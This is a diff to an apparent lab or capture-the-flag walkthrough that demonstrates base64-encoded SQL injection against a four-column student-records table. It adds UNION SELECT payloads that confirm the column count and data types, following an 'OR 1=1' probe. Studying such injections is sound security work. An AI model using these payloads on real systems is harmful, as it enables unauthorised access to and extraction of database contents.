@@ -115,6 +115,18 @@ payload= `data=<@base64>621729581 OR 1=1<@/base64>`  <-- I'm using Hackvertor bu
 
 <img width="918" alt="image" src="https://user-images.githubusercontent.com/79740895/208964245-b65f25db-f151-4791-8cf1-c43d3a977d9d.png">
 
+we know the number of columns it is 4 : `ID,	Name,	Roll,	Marks`.So the payload for union attack would be:
+
+payload: `data=<@base64>621729581 UNION SELECT NULL, NULL, NULL, NULL<@/base64>`
+
+It gives us the result in response so payload is correct and we also know the data types it should be Integer for ID, Roll, Marks and String for Name so we can put this values in payload.
+
+payload: `data=<@base64>621729581 UNION SELECT 1, "name", 2, 3<@/base64>`
+
+response:
+
+<img width="174" alt="image" src="https://user-images.githubusercontent.com/79740895/208965679-8c116a48-31b5-4c6c-a8d8-d7e39ae5c49a.png">
+
 
 
 
